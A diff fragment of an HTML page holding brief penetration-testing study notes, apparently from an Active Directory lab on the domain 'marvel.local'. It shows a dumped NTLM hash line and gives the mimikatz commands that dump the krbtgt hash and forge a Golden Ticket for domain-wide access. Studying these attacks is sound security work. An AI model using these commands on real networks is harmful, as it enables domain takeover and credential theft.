+SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:8b2d1b39126b6aa5f13fcaa67ca34ac5:::<br/>
+<br/>
+<br/>
+just crack the NT part(part after :)<br/>
+LM part(before :) is same for all<br/>
+<br/>
+<br/>
+<br/>
+Golden Ticket<br/>
+Happens when we compromise krbtgt account<br/>
+We can access to any resource on the domain<br/>
+Golden ticket==access to every machine<br/>
+<br/>
+mimikatz on DC<br/>
+#privilege::debug<br/>
+<br/>
+#lsadump::lsa /inject /krbtgt<br/>
+we need the SID of domain<br/>
+and NTLM hash of krbtgt account<br/>
+<br/>
+#kerberos::golden /User:Administrator /domain:marvel.local /sid:SIDhere /krbtgt:NThashofjrbtgt /id:500 /ptt<br/>
+ptt:pass the ticket<br/>
+id of admin account<br/>
+user can be any but must be a real user<br/>
+<br/>
+now open another shell and we can access data of any machine<br/>
+</body></html>
